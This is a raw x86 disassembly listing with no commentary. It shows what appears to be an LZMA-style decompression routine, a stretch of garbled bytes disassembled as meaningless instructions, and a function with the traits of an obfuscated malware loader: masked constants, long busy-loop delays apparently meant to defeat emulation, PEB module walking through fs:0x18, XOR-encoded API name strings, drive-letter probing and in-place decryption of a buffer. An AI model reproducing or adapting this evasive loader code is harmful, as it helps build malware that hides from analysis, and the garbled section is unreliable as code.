  425724:	neg    cl
  425726:	shr    esi,cl
  425728:	pop    eax
  425729:	add    edi,esi
  42572b:	pop    esi
  42572c:	lea    edi,[edi+edi*2]
  42572f:	shl    edi,0x8
  425732:	cmp    al,0x7
  425734:	pop    edx
  425735:	lea    ecx,[esi+edi*2+0xe6c]
  42573c:	push   ecx
  42573d:	push   esi
  42573e:	mov    esi,0x100
  425743:	push   eax
  425744:	mov    al,0x1
  425746:	jb     0x42577c
  425748:	mov    edi,DWORD PTR [ebp-0x4]
  42574b:	sub    edi,DWORD PTR [ebp-0x24]
  42574e:	movzx  edi,BYTE PTR [edi]
  425751:	mov    ebp,DWORD PTR [ebp-0x34]
  425754:	shl    edi,1
  425756:	mov    ecx,esi
  425758:	and    esi,edi
  42575a:	add    ecx,esi
  42575c:	lea    ebp,[ebp+ecx*2+0x0]
  425760:	call   0x425a15
  425765:	mov    ecx,eax
  425767:	shr    esi,0x8
  42576a:	and    ecx,0x1
  42576d:	cmp    esi,ecx
  42576f:	mov    esi,0x100
  425774:	jne    0x425784
  425776:	cmp    eax,esi
  425778:	jb     0x425751
  42577a:	jmp    0x425790
  42577c:	mov    ebp,DWORD PTR [ebp-0x34]
  42577f:	call   0x425a15
  425784:	inc    eax
  425785:	inc    esi
  425786:	sub    eax,0x1
  425789:	sub    esi,0x1
  42578c:	cmp    eax,esi
  42578e:	jb     0x42577c
  425790:	pop    edx
  425791:	inc    edx
  425792:	cmp    edx,0x5
  425795:	dec    edx
  425796:	mov    ecx,edx
  425798:	jb     0x4257a9
  42579a:	inc    edx
  42579b:	cmp    edx,0xb
  42579e:	dec    edx
  42579f:	mov    cl,0x4
  4257a1:	dec    cl
  4257a3:	jb     0x4257a9
  4257a5:	mov    cl,0x7
  4257a7:	dec    cl
  4257a9:	sub    edx,ecx
  4257ab:	push   edx
  4257ac:	jmp    0x4257fd
  4257ae:	mov    al,0xc1
  4257b0:	dec    al
  4257b2:	call   0x425a06
  4257b7:	jne    0x4257cd
  4257b9:	pop    eax
  4257ba:	pop    edi
  4257bb:	pop    edx
  4257bc:	pop    ecx
  4257bd:	pop    edx
  4257be:	pop    ecx
  4257bf:	push   DWORD PTR [esp]
  4257c2:	push   ecx
  4257c3:	push   edx
  4257c4:	mov    edx,0x664
  4257c9:	mov    cl,0x0
  4257cb:	jmp    0x425840
  4257cd:	mov    al,0xcd
  4257cf:	dec    al
  4257d1:	call   0x425a06
  4257d6:	jne    0x425806
  4257d8:	mov    al,0xf1
  4257da:	dec    al
  4257dc:	call   0x4259f6
  4257e1:	jne    0x425836
  4257e3:	pop    eax
  4257e4:	cmp    al,0x7
  4257e6:	mov    al,0x9
  4257e8:	jb     0x4257ec
  4257ea:	mov    al,0xb
  4257ec:	push   eax
  4257ed:	mov    esi,DWORD PTR [ebp-0x4]
  4257f0:	sub    esi,DWORD PTR [ebp-0x24]
  4257f3:	cmp    esi,DWORD PTR [ebp+0x24]
  4257f6:	jb     0x4259cd
  4257fc:	lods   al,BYTE PTR ds:[esi]
  4257fd:	mov    edi,DWORD PTR [ebp-0x4]
  425800:	stos   BYTE PTR es:[edi],al
  425801:	jmp    0x425994
  425806:	mov    al,0xd8
  425808:	call   0x425a06
  42580d:	mov    esi,DWORD PTR [ebp-0x28]
  425810:	je     0x42582d
  425812:	mov    al,0xe4
  425814:	call   0x425a06
  425819:	mov    esi,DWORD PTR [ebp-0x2c]
  42581c:	je     0x425827
  42581e:	mov    esi,DWORD PTR [ebp-0x30]
  425821:	mov    ecx,DWORD PTR [ebp-0x2c]
  425824:	mov    DWORD PTR [ebp-0x30],ecx
  425827:	mov    ecx,DWORD PTR [ebp-0x28]
  42582a:	mov    DWORD PTR [ebp-0x2c],ecx
  42582d:	mov    ecx,DWORD PTR [ebp-0x24]
  425830:	mov    DWORD PTR [ebp-0x28],ecx
  425833:	mov    DWORD PTR [ebp-0x24],esi
  425836:	pop    eax
  425837:	pop    edi
  425838:	pop    ecx
  425839:	mov    edx,0xa68
  42583e:	mov    cl,0x8
  425840:	add    edx,edi
  425842:	push   edx
  425843:	push   edi
  425844:	cmp    al,0x7
  425846:	mov    al,cl
  425848:	jb     0x42584c
  42584a:	add    al,0x3
  42584c:	push   eax
  42584d:	mov    ebp,DWORD PTR [ebp-0x34]
  425850:	call   0x425a13
  425855:	jne    0x42586b
  425857:	mov    eax,DWORD PTR [ebp-0x18]
  42585a:	mov    edi,DWORD PTR [ebp-0x34]
  42585d:	shl    eax,0x3
  425860:	sub    ecx,ecx
  425862:	push   0x8
  425864:	pop    esi
  425865:	lea    edi,[edi+eax*2+0x4]
  425869:	jmp    0x4258a0
  42586b:	mov    ebp,DWORD PTR [ebp-0x34]
  42586e:	add    ebp,0x2
  425871:	call   0x425a13
  425876:	jne    0x425890
  425878:	mov    eax,DWORD PTR [ebp-0x18]
  42587b:	mov    edi,DWORD PTR [ebp-0x34]
  42587e:	shl    eax,0x3
  425881:	push   0x8
  425883:	pop    ecx
  425884:	push   0x8
  425886:	pop    esi
  425887:	lea    edi,[edi+eax*2+0x104]
  42588e:	jmp    0x4258a0
  425890:	mov    edi,0x204
  425895:	add    edi,DWORD PTR [ebp-0x34]
  425898:	push   0x10
  42589a:	pop    ecx
  42589b:	mov    esi,0x100
  4258a0:	mov    DWORD PTR [ebp-0x1c],ecx
  4258a3:	sub    eax,eax
  4258a5:	inc    eax
  4258a6:	mov    ebp,edi
  4258a8:	call   0x425a15
  4258ad:	mov    ecx,eax
  4258af:	sub    ecx,esi
  4258b1:	jb     0x4258a6
  4258b3:	add    DWORD PTR [ebp-0x1c],ecx
  4258b6:	cmp    DWORD PTR [ebp-0x3c],0x4
  4258ba:	jae    0x425970
  4258c0:	add    DWORD PTR [ebp-0x3c],0x7
  4258c4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4258c7:	cmp    ecx,0x4
  4258ca:	jb     0x4258cf
  4258cc:	push   0x3
  4258ce:	pop    ecx
  4258cf:	mov    edi,DWORD PTR [ebp-0x38]
  4258d2:	shl    ecx,0x6
  4258d5:	sub    eax,eax
  4258d7:	inc    eax
  4258d8:	push   0x40
  4258da:	pop    esi
  4258db:	lea    edi,[edi+ecx*2+0x360]
  4258e2:	mov    ebp,edi
  4258e4:	call   0x425a15
  4258e9:	mov    ecx,eax
  4258eb:	sub    ecx,esi
  4258ed:	jb     0x4258e2
  4258ef:	mov    DWORD PTR [ebp-0x18],ecx
  4258f2:	mov    DWORD PTR [ebp-0x24],ecx
  4258f5:	cmp    ecx,0x4
  4258f8:	jb     0x42596d
  4258fa:	mov    esi,ecx
  4258fc:	and    DWORD PTR [ebp-0x24],0x1
  425900:	shr    esi,1
  425902:	or     DWORD PTR [ebp-0x24],0x2
  425906:	dec    esi
  425907:	cmp    ecx,0xe
  42590a:	jae    0x425925
  42590c:	mov    eax,0x2af
  425911:	sub    eax,ecx
  425913:	mov    ecx,esi
  425915:	shl    BYTE PTR [ebp-0x24],cl
  425918:	add    eax,DWORD PTR [ebp-0x24]
  42591b:	shl    eax,1
  42591d:	add    eax,DWORD PTR [ebp-0x38]
  425920:	mov    DWORD PTR [ebp-0x34],eax
  425923:	jmp    0x425952
  425925:	sub    esi,0x4
  425928:	call   0x4259d2
  42592d:	shr    ebx,1
  42592f:	shl    DWORD PTR [ebp-0x24],1
  425932:	cmp    DWORD PTR [ebp-0x20],ebx
  425935:	jb     0x42593d
  425937:	inc    DWORD PTR [ebp-0x24]
  42593a:	sub    DWORD PTR [ebp-0x20],ebx
  42593d:	dec    esi
  42593e:	jne    0x425928
  425940:	mov    eax,0x644
  425945:	add    eax,DWORD PTR [ebp-0x38]
  425948:	mov    DWORD PTR [ebp-0x34],eax
  42594b:	shl    DWORD PTR [ebp-0x24],0x4
  42594f:	push   0x4
  425951:	pop    esi
  425952:	sub    edi,edi
  425954:	inc    edi
  425955:	mov    eax,edi
  425957:	mov    ebp,DWORD PTR [ebp-0x34]
  42595a:	call   0x425a15
  42595f:	test   al,0x1
  425961:	je     0x425966
  425963:	or     DWORD PTR [ebp-0x24],edi
  425966:	shl    edi,1
  425968:	dec    esi
  425969:	jne    0x425957
  42596b:	jmp    0x42596d
  42596d:	inc    DWORD PTR [ebp-0x24]
  425970:	mov    ecx,DWORD PTR [ebp-0x1c]
  425973:	add    ecx,0x2
  425976:	mov    edi,DWORD PTR [ebp-0x4]
  425979:	mov    eax,edi
  42597b:	sub    eax,DWORD PTR [ebp+0x24]
  42597e:	cmp    DWORD PTR [ebp-0x24],eax
  425981:	ja     0x4259cd
  425983:	mov    esi,edi
  425985:	sub    esi,DWORD PTR [ebp-0x24]
  425988:	mov    edx,DWORD PTR [ebp+0x28]
  42598b:	lods   al,BYTE PTR ds:[esi]
  42598c:	stos   BYTE PTR es:[edi],al
  42598d:	cmp    edi,edx
  42598f:	jae    0x425994
  425991:	dec    ecx
  425992:	jne    0x42598b
  425994:	mov    DWORD PTR [ebp-0x4],edi
  425997:	movzx  esi,al
  42599a:	cmp    edi,DWORD PTR [ebp+0x28]
  42599d:	jb     0x4256fe
  4259a3:	call   0x4259d2
  4259a8:	sub    eax,eax
  4259aa:	lea    ebp,[esp+0x3c]
  4259ae:	mov    edx,DWORD PTR [ebp+0x20]
  4259b1:	mov    esi,DWORD PTR [ebp-0x8]
  4259b4:	sub    esi,DWORD PTR [ebp+0x18]
  4259b7:	mov    DWORD PTR [edx],esi
  4259b9:	mov    edx,DWORD PTR [ebp+0x2c]
  4259bc:	mov    edi,DWORD PTR [ebp-0x4]
  4259bf:	sub    edi,DWORD PTR [ebx+0x16]
  4259c2:	lods   al,BYTE PTR ds:[esi]
  4259c3:	outs   dx,BYTE PTR ds:[esi]
  4259c4:	lods   eax,DWORD PTR ds:[esi]
  4259c5:	repz inc DWORD PTR [ebx]
  4259c8:	xchg   ecx,eax
  4259c9:	test   BYTE PTR [esi-0x76cd1801],0x87
  4259d0:	xor    eax,0x86758ce9
  4259d5:	xchg   BYTE PTR [esi-0x6a75b076],al
  4259db:	lea    edx,ds:0x5bb4dfa6
  4259e1:	imul   esi,DWORD PTR [edx+0x5b],0xb41953f6
  4259e8:	fwait
  4259e9:	or     DWORD PTR [ebp-0x53c759f7],ecx
  4259ef:	fwait
  4259f0:	or     DWORD PTR [ebx+ebx*2-0x4b6a0097],ebp
  4259f7:	mov    ebx,0x8960c299
  4259fc:	lea    ecx,ds:0x299b9296
  425a02:	xchg   edx,eax
  425a03:	lea    esi,ds:0x8960c29e
  425a09:	xchg   edx,eax
  425a0a:	fwait
  425a0b:	cdq    
  425a0c:	mov    ah,0x3b
  425a0e:	test   eax,0x869b37bc
  425a13:	xor    cl,BYTE PTR [ecx-0x7964c844]
  425a19:	mov    WORD PTR [ebp-0x7a],?
  425a1c:	xchg   BYTE PTR [esi-0x4b09ac76],al
  425a22:	mov    bh,0x16
  425a24:	lea    dx,[edi]
  425a27:	push   ss
  425a28:	push   es
  425a29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a2a:	jb     0x4259e3
  425a2c:	push   ss
  425a2d:	not    DWORD PTR [ebx-0x8]
  425a30:	mov    al,0xca
  425a32:	test   DWORD PTR [edi+0x158d6616],edx
  425a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a39:	test   al,0xd7
  425a3b:	push   ss
  425a3c:	push   es
  425a3d:	mov    ah,0xb5
  425a3f:	ret    0x55b7
  425a42:	add    cl,al
  425a44:	jmp    0xcaf16954
  425a49:	cmp    DWORD PTR [esp+0x20],ecx
  425a4d:	jae    0x425a66
  425a4f:	mov    ebx,ecx
  425a51:	mov    ecx,0x800
  425a56:	sub    ecx,edx
  425a58:	shr    ecx,0x5
  425a5b:	add    WORD PTR [ebp+0x0],cx
  425a5f:	add    eax,eax
  425a61:	lea    ebp,[esp+0x40]
  425a65:	ret    
  425a66:	shr    edx,0x5
  425a69:	sub    DWORD PTR [esp+0x20],ecx
  425a6d:	sub    ebx,ecx
  425a6f:	sub    WORD PTR [ebp+0x0],dx
  425a73:	add    eax,eax
  425a75:	add    eax,0x1
  425a78:	lea    ebp,[esp+0x40]
  425a7c:	ret    
  425a7d:	push   ebp
  425a7e:	mov    ebp,esp
  425a80:	sub    esp,0x12c
  425a86:	push   ebx
  425a87:	push   esi
  425a88:	push   edi
  425a89:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  425a90:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  425a97:	mov    eax,DWORD PTR [ebp+0x8]
  425a9a:	mov    DWORD PTR [ebp+0x8],eax
  425a9d:	mov    ecx,DWORD PTR [ebp-0x10]
  425aa0:	mov    ebx,0x75108aa
  425aa5:	xor    ecx,ebx
  425aa7:	mov    eax,0x3272f1
  425aac:	add    ecx,eax
  425aae:	mov    DWORD PTR [ebp-0x24],ecx
  425ab1:	mov    ecx,DWORD PTR [ebp-0x10]
  425ab4:	xor    ecx,ebx
  425ab6:	add    ecx,eax
  425ab8:	mov    DWORD PTR [ebp-0x40],ecx
  425abb:	mov    ecx,DWORD PTR [ebp-0x10]
  425abe:	xor    ecx,ebx
  425ac0:	add    ecx,eax
  425ac2:	mov    DWORD PTR [ebp-0x3c],ecx
  425ac5:	mov    ecx,DWORD PTR [ebp-0x10]
  425ac8:	xor    ecx,ebx
  425aca:	add    ecx,eax
  425acc:	mov    DWORD PTR [ebp-0xd8],ecx
  425ad2:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  425ad9:	mov    DWORD PTR [ebp-0x3c],0xf89cb5a5
  425ae0:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  425ae7:	push   0x25
  425ae9:	pop    ecx
  425aea:	mov    DWORD PTR [ebp-0x30],ecx
  425aed:	mov    DWORD PTR [ebp-0x30],ecx
  425af0:	push   0x65
  425af2:	pop    ecx
  425af3:	mov    DWORD PTR [ebp-0x30],ecx
  425af6:	mov    DWORD PTR [ebp-0x30],ecx
  425af9:	mov    DWORD PTR [ebp-0x30],0x4d
  425b00:	mov    DWORD PTR [ebp-0x30],0x43
  425b07:	mov    ecx,DWORD PTR [ebp-0x10]
  425b0a:	xor    ecx,ebx
  425b0c:	add    ecx,eax
  425b0e:	mov    DWORD PTR [ebp-0x30],ecx
  425b11:	mov    ecx,DWORD PTR [ebp-0x10]
  425b14:	xor    ecx,ebx
  425b16:	add    ecx,eax
  425b18:	mov    DWORD PTR [ebp-0x30],ecx
  425b1b:	mov    DWORD PTR [ebp-0x28],0x258
  425b22:	mov    DWORD PTR [ebp-0x34],0x36
  425b29:	mov    DWORD PTR [ebp-0x14],0x7a
  425b30:	lea    edi,[ebp-0x10c]
  425b36:	lea    esi,[ebp-0x12c]
  425b3c:	call   0x4267fb
  425b41:	dec    DWORD PTR [ebp-0x14]
  425b44:	jne    0x425b30
  425b46:	dec    DWORD PTR [ebp-0x34]
  425b49:	jne    0x425b29
  425b4b:	dec    DWORD PTR [ebp-0x28]
  425b4e:	jne    0x425b22
  425b50:	mov    DWORD PTR [ebp-0x28],0x400e
  425b57:	mov    eax,DWORD PTR [ebp-0x10]
  425b5a:	xor    eax,ebx
  425b5c:	mov    esi,0x3272f1
  425b61:	add    eax,esi
  425b63:	mov    DWORD PTR [ebp-0x1c],eax
  425b66:	mov    eax,DWORD PTR [ebp-0x10]
  425b69:	and    DWORD PTR [ebp-0x94],0x0
  425b70:	xor    eax,ebx
  425b72:	add    eax,esi
  425b74:	mov    DWORD PTR [ebp-0x38],eax
  425b77:	mov    eax,fs:0x18
  425b7d:	mov    DWORD PTR [ebp-0x94],eax
  425b83:	mov    eax,DWORD PTR [eax+0x30]
  425b86:	mov    DWORD PTR [ebp-0xcc],eax
  425b8c:	mov    eax,DWORD PTR [eax+0xc]
  425b8f:	mov    DWORD PTR [ebp-0xc0],eax
  425b95:	mov    eax,DWORD PTR [ebp+0x8]
  425b98:	lea    ecx,[ebp-0x94]
  425b9e:	mov    DWORD PTR [eax+0x1a0],ecx
  425ba4:	mov    eax,DWORD PTR [ebp+0x8]
  425ba7:	lea    ecx,[ebp-0xcc]
  425bad:	mov    DWORD PTR [eax+0x1a4],ecx
  425bb3:	mov    eax,DWORD PTR [ebp+0x8]
  425bb6:	push   DWORD PTR [ebp+0x8]
  425bb9:	lea    ecx,[ebp-0xc0]
  425bbf:	mov    DWORD PTR [eax+0x1a8],ecx
  425bc5:	call   0x427fbc
  425bca:	mov    ecx,DWORD PTR [ebp-0x10]
  425bcd:	xor    ecx,ebx
  425bcf:	add    ecx,esi
  425bd1:	cmp    ecx,eax
  425bd3:	je     0x425f56
  425bd9:	mov    eax,DWORD PTR [ebp+0x8]
  425bdc:	mov    eax,DWORD PTR [eax+0x194]
  425be2:	mov    ecx,DWORD PTR [eax]
  425be4:	mov    eax,DWORD PTR [ebp+0x8]
  425be7:	mov    eax,DWORD PTR [eax+0x194]
  425bed:	mov    eax,DWORD PTR [eax]
  425bef:	add    eax,DWORD PTR [ecx+0x3c]
  425bf2:	mov    ecx,DWORD PTR [ebp+0x8]
  425bf5:	mov    ecx,DWORD PTR [ecx+0x1e0]
  425bfb:	lea    edx,[ebp-0xec]
  425c01:	push   edx
  425c02:	mov    edx,DWORD PTR [ebp+0x8]
  425c05:	mov    edx,DWORD PTR [edx+0x18c]
  425c0b:	mov    edx,DWORD PTR [edx]
  425c0d:	add    edx,DWORD PTR [eax+0x88]
  425c13:	push   0x4
  425c15:	push   DWORD PTR [eax+0x8c]
  425c1b:	push   edx
  425c1c:	call   DWORD PTR [ecx+0x1c]
  425c1f:	push   DWORD PTR [ebp+0x8]
  425c22:	xor    eax,eax
  425c24:	mov    DWORD PTR [ebp-0xa8],0x1b3e0e34
  425c2e:	mov    DWORD PTR [ebp-0xa4],0x12370d1c
  425c38:	mov    DWORD PTR [ebp-0xa0],0x3c0d180a
  425c42:	mov    BYTE PTR [ebp-0x9c],0x83
  425c49:	lea    edi,[ebp-0x9b]
  425c4f:	stos   DWORD PTR es:[edi],eax
  425c50:	stos   WORD PTR es:[edi],ax
  425c52:	stos   BYTE PTR es:[edi],al
  425c53:	xor    eax,eax
  425c55:	mov    DWORD PTR [ebp-0xbc],0x1b3e0e34
  425c5f:	mov    DWORD PTR [ebp-0xb8],0x12370d1c
  425c69:	mov    DWORD PTR [ebp-0xb4],0x2a0d180a
  425c73:	mov    BYTE PTR [ebp-0xb0],0x83
  425c7a:	lea    edi,[ebp-0xaf]
  425c80:	stos   DWORD PTR es:[edi],eax
  425c81:	stos   WORD PTR es:[edi],ax
  425c83:	stos   BYTE PTR es:[edi],al
  425c84:	mov    edi,DWORD PTR [ebp+0x8]
  425c87:	mov    eax,DWORD PTR [ebp+0x8]
  425c8a:	mov    edx,DWORD PTR [eax+0x1b8]
  425c90:	mov    DWORD PTR [ebp-0x68],0xd0f0e17
  425c97:	mov    DWORD PTR [ebp-0x64],0x1413101e
  425c9e:	mov    WORD PTR [ebp-0x60],0x833c
  425ca4:	mov    DWORD PTR [ebp-0x90],0x1b3e0e34
  425cae:	mov    DWORD PTR [ebp-0x8c],0x173c0d1c
  425cb8:	mov    DWORD PTR [ebp-0x88],0x311c1b13
  425cc2:	mov    DWORD PTR [ebp-0x84],0xd181008
  425ccc:	mov    DWORD PTR [ebp-0x80],0x833c1e14
  425cd3:	mov    DWORD PTR [ebp-0x7c],0x1b3e0e34
  425cda:	mov    DWORD PTR [ebp-0x78],0x173c0d1c
  425ce1:	mov    DWORD PTR [ebp-0x74],0x311c1b13
  425ce8:	mov    DWORD PTR [ebp-0x70],0xd181008
  425cef:	mov    DWORD PTR [ebp-0x6c],0x832a1e14
  425cf6:	call   0x427feb
  425cfb:	push   eax
  425cfc:	mov    eax,DWORD PTR [ebp+0x8]
  425cff:	mov    eax,DWORD PTR [eax+0x1a8]
  425d05:	push   DWORD PTR [eax]
  425d07:	call   0x427c8c
  425d0c:	test   eax,eax
  425d0e:	jne    0x425d60
  425d10:	mov    eax,DWORD PTR [ebp+0x8]
  425d13:	mov    eax,DWORD PTR [eax+0x1e0]
  425d19:	mov    edi,DWORD PTR [ebp+0x8]
  425d1c:	add    eax,0x4
  425d1f:	mov    DWORD PTR [ebp-0x20],eax
  425d22:	mov    eax,DWORD PTR [ebp+0x8]
  425d25:	mov    edx,DWORD PTR [eax+0x1b8]
  425d2b:	call   0x427feb
  425d30:	push   eax
  425d31:	mov    eax,DWORD PTR [ebp-0x20]
  425d34:	call   DWORD PTR [eax]
  425d36:	test   eax,eax
  425d38:	jne    0x425d60
  425d3a:	mov    eax,DWORD PTR [ebp+0x8]
  425d3d:	mov    eax,DWORD PTR [eax+0x1e0]
  425d43:	mov    edi,DWORD PTR [ebp+0x8]
  425d46:	add    eax,0x10
  425d49:	mov    DWORD PTR [ebp-0x20],eax
  425d4c:	mov    eax,DWORD PTR [ebp+0x8]
  425d4f:	mov    edx,DWORD PTR [eax+0x1b8]
  425d55:	call   0x427feb
  425d5a:	push   eax
  425d5b:	mov    eax,DWORD PTR [ebp-0x20]
  425d5e:	call   DWORD PTR [eax]
  425d60:	mov    eax,DWORD PTR [ebp-0x10]
  425d63:	mov    ecx,DWORD PTR [ebp-0x28]
  425d66:	xor    eax,ebx
  425d68:	add    eax,esi
  425d6a:	cmp    eax,ecx
  425d6c:	je     0x425f2f
  425d72:	mov    eax,DWORD PTR [ebp-0x18]
  425d75:	xor    eax,ebx
  425d77:	mov    ecx,0xffcd8d0f
  425d7c:	sub    ecx,eax
  425d7e:	add    ecx,DWORD PTR [ebp-0x28]
  425d81:	mov    eax,DWORD PTR [ebp-0x1c]
  425d84:	cmp    eax,ecx
  425d86:	ja     0x425f2f
  425d8c:	mov    DWORD PTR [ebp-0x34],0x0
  425d93:	push   DWORD PTR [ebp+0x8]
  425d96:	mov    edi,DWORD PTR [ebp+0x8]
  425d99:	mov    eax,DWORD PTR [ebp+0x8]
  425d9c:	mov    edx,DWORD PTR [eax+0x1b4]
  425da2:	call   0x427feb
  425da7:	push   eax
  425da8:	mov    eax,DWORD PTR [ebp+0x8]
  425dab:	mov    eax,DWORD PTR [eax+0x1a8]
  425db1:	push   DWORD PTR [eax]
  425db3:	call   0x427c8c
  425db8:	mov    ecx,DWORD PTR [ebp+0x8]
  425dbb:	mov    ecx,DWORD PTR [ecx+0x19c]
  425dc1:	mov    DWORD PTR [ecx],eax
  425dc3:	mov    eax,DWORD PTR [ebp+0x8]
  425dc6:	mov    edi,DWORD PTR [eax+0x1e0]
  425dcc:	mov    esi,DWORD PTR [ebp+0x8]
  425dcf:	xor    eax,eax
  425dd1:	lea    edx,[ebp-0x7c]
  425dd4:	call   0x428021
  425dd9:	push   eax
  425dda:	mov    eax,DWORD PTR [ebp+0x8]
  425ddd:	mov    eax,DWORD PTR [eax+0x19c]
  425de3:	push   DWORD PTR [eax]
  425de5:	call   DWORD PTR [edi+0x8]
  425de8:	mov    DWORD PTR [ebp-0x20],eax
  425deb:	mov    eax,DWORD PTR [ebp+0x8]
  425dee:	mov    edi,DWORD PTR [eax+0x1e0]
  425df4:	mov    esi,DWORD PTR [ebp+0x8]
  425df7:	xor    eax,eax
  425df9:	lea    edx,[ebp-0x90]
  425dff:	call   0x428021
  425e04:	push   eax
  425e05:	mov    eax,DWORD PTR [ebp+0x8]
  425e08:	mov    eax,DWORD PTR [eax+0x19c]
  425e0e:	push   DWORD PTR [eax]
  425e10:	call   DWORD PTR [edi+0x8]
  425e13:	mov    eax,DWORD PTR [ebp+0x8]
  425e16:	mov    edi,DWORD PTR [eax+0x1e0]
  425e1c:	mov    esi,DWORD PTR [ebp+0x8]
  425e1f:	xor    eax,eax
  425e21:	lea    edx,[ebp-0xa8]
  425e27:	call   0x428021
  425e2c:	push   eax
  425e2d:	mov    eax,DWORD PTR [ebp+0x8]
  425e30:	mov    eax,DWORD PTR [eax+0x19c]
  425e36:	push   DWORD PTR [eax]
  425e38:	call   DWORD PTR [edi+0x8]
  425e3b:	and    DWORD PTR [ebp-0x8],0x0
  425e3f:	mov    DWORD PTR [ebp-0x48],eax
  425e42:	mov    eax,DWORD PTR [ebp-0x8]
  425e45:	and    eax,0x7
  425e48:	add    eax,0x31
  425e4b:	push   eax
  425e4c:	call   DWORD PTR [ebp-0x20]
  425e4f:	test   eax,eax
  425e51:	je     0x425e95
  425e53:	mov    eax,DWORD PTR [ebp-0x8]
  425e56:	push   0x19
  425e58:	xor    edx,edx
  425e5a:	pop    ecx
  425e5b:	div    ecx
  425e5d:	add    dl,0x41
  425e60:	movzx  eax,dl
  425e63:	push   eax
  425e64:	call   DWORD PTR [ebp-0x48]
  425e67:	test   eax,eax
  425e69:	jne    0x425e95
  425e6b:	mov    eax,DWORD PTR [ebp+0x8]
  425e6e:	mov    edi,DWORD PTR [eax+0x1e0]
  425e74:	mov    esi,DWORD PTR [ebp+0x8]
  425e77:	xor    eax,eax
  425e79:	lea    edx,[ebp-0x68]
  425e7c:	call   0x428021
  425e81:	push   eax
  425e82:	mov    eax,DWORD PTR [ebp+0x8]
  425e85:	mov    eax,DWORD PTR [eax+0x198]
  425e8b:	push   DWORD PTR [eax]
  425e8d:	call   DWORD PTR [edi+0x8]
  425e90:	mov    DWORD PTR [ebp-0x14],eax
  425e93:	jmp    0x425e99
  425e95:	and    DWORD PTR [ebp-0x14],0x0
  425e99:	inc    DWORD PTR [ebp-0x8]
  425e9c:	cmp    DWORD PTR [ebp-0x8],0x10
  425ea0:	jb     0x425e42
  425ea2:	mov    eax,DWORD PTR [ebp-0x18]
  425ea5:	mov    esi,DWORD PTR [ebp+0x8]
  425ea8:	xor    eax,ebx
  425eaa:	mov    edi,0x3272f1
  425eaf:	add    eax,edi
  425eb1:	lea    edx,[ebp-0x10c]
  425eb7:	call   0x428021
  425ebc:	push   eax
  425ebd:	mov    eax,DWORD PTR [ebp-0x10]
  425ec0:	mov    esi,DWORD PTR [ebp+0x8]
  425ec3:	xor    eax,ebx
  425ec5:	add    eax,edi
  425ec7:	lea    edx,[ebp-0x12c]
  425ecd:	call   0x428021
  425ed2:	push   eax
  425ed3:	call   DWORD PTR [ebp-0x14]
  425ed6:	mov    ecx,DWORD PTR [ebp-0x10]
  425ed9:	xor    ecx,ebx
  425edb:	add    ecx,edi
  425edd:	cmp    ecx,eax
  425edf:	jne    0x425ee8
  425ee1:	mov    DWORD PTR [ebp-0x34],0x1
  425ee8:	mov    eax,DWORD PTR [ebp-0x18]
  425eeb:	mov    ecx,DWORD PTR [ebp-0x1c]
  425eee:	xor    eax,ebx
  425ef0:	lea    eax,[eax+ecx*1+0x3272f1]
  425ef7:	mov    DWORD PTR [ebp-0x1c],eax
  425efa:	mov    eax,DWORD PTR [ebp-0x34]
  425efd:	test   eax,eax
  425eff:	je     0x425f13
  425f01:	mov    eax,DWORD PTR [ebp-0x18]
  425f04:	mov    ecx,DWORD PTR [ebp-0x38]
  425f07:	xor    eax,ebx
  425f09:	lea    eax,[eax+ecx*1+0x3272f1]
  425f10:	mov    DWORD PTR [ebp-0x38],eax
  425f13:	mov    eax,DWORD PTR [ebp-0x18]
  425f16:	xor    eax,ebx
  425f18:	mov    ecx,0xffcd8d0f
  425f1d:	sub    ecx,eax
  425f1f:	add    ecx,DWORD PTR [ebp-0x28]
  425f22:	mov    eax,DWORD PTR [ebp-0x1c]
  425f25:	cmp    eax,ecx
  425f27:	jbe    0x425d8c
  425f2d:	mov    esi,edi
  425f2f:	mov    eax,DWORD PTR [ebp-0x38]
  425f32:	mov    ecx,DWORD PTR [ebp-0x1c]
  425f35:	cmp    ecx,eax
  425f37:	jne    0x425f4a
  425f39:	push   DWORD PTR [ebp+0x8]
  425f3c:	lea    eax,[ebp-0x40]
  425f3f:	push   eax
  425f40:	call   0x428a8e
  425f45:	mov    DWORD PTR [ebp-0x24],eax
  425f48:	jmp    0x425f56
  425f4a:	mov    eax,DWORD PTR [ebp-0x24]
  425f4d:	mov    ecx,DWORD PTR [ebp-0x18]
  425f50:	xor    ecx,ebx
  425f52:	add    ecx,esi
  425f54:	xor    DWORD PTR [eax],ecx
  425f56:	mov    eax,DWORD PTR [ebp-0x10]
  425f59:	mov    ecx,DWORD PTR [ebp-0x24]
  425f5c:	xor    eax,ebx
  425f5e:	add    eax,esi
  425f60:	cmp    eax,ecx
  425f62:	je     0x4266d9
  425f68:	mov    eax,DWORD PTR [ebp-0x10]
  425f6b:	mov    ecx,DWORD PTR [ebp-0x40]
  425f6e:	xor    eax,ebx
  425f70:	add    eax,esi
  425f72:	cmp    eax,ecx
  425f74:	je     0x4266d9
  425f7a:	mov    eax,DWORD PTR [ebp-0x10]
  425f7d:	xor    eax,ebx
  425f7f:	add    eax,esi
  425f81:	jmp    0x425f9f
  425f83:	mov    edi,DWORD PTR [ebp-0x24]
  425f86:	mov    cl,al
  425f88:	and    cl,0x1f
  425f8b:	or     dl,0xff
  425f8e:	sub    dl,cl
  425f90:	add    BYTE PTR [edi+eax*1],dl
  425f93:	mov    ecx,DWORD PTR [ebp-0x18]
  425f96:	xor    ecx,ebx
  425f98:	lea    eax,[eax+ecx*1+0x3272f1]
  425f9f:	mov    ecx,DWORD PTR [ebp-0x40]
  425fa2:	cmp    eax,ecx
  425fa4:	jb     0x425f83
  425fa6:	mov    eax,DWORD PTR [ebp-0x40]
  425fa9:	mov    DWORD PTR [ebp-0x28],eax
  425fac:	mov    eax,DWORD PTR [ebp-0x24]
  425faf:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  425fb6:	mov    DWORD PTR [ebp-0xd4],eax
  425fbc:	mov    edi,0xf89c85ba
  425fc1:	mov    DWORD PTR [ebp-0x2c],edi
  425fc4:	mov    eax,DWORD PTR [ebp-0x38]
  425fc7:	xor    eax,ebx
  425fc9:	add    eax,esi
  425fcb:	mov    DWORD PTR [ebp-0xc],eax
